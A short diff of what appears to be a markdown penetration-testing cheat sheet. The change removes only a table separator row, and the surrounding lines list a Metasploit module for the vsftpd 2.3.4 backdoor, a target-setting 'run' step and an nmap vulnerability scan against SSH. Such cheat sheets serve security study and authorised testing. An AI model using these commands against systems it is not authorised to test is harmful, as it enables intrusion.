@@ -81,8 +81,6 @@ set RHOSTS <target>
 run
  |  **Exploit FTP Backdoor (vsftpd 2.3.4)** |
 | use exploit/unix/ftp/vsftpd_234_backdoor | Exploits vsFTPd 2.3.4 backdoor vulnerability. |
-| —————————————————————— | ————————————————————————————————— |
-
 
 | 2] ssh (22) |  |
 | `nmap -sV -sC --script vuln <target_ip> -p 22` | ssh port scan with vuln script |
